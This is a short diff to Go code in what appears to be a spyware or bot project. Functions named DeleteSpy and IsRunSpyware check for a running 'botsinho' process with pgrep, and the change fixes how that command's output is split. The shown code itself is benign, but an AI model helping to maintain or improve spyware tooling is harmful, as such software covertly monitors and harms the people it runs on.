@@ -59,7 +59,7 @@ func DeleteSpy(){
 func IsRunSpyware()(bool, []string){
 	com := exec.Command("bash", "-c", "pgrep botsinho")
 	out, _ := com.Output()
-	dat := strings.Split(strings.Replace(string(out), "\n", "", 5), " ")
+	dat := strings.Split(strings.Replace(string(out), "\n", " ", 5), " ")
 	
 	return len(dat) == 1, dat
 	
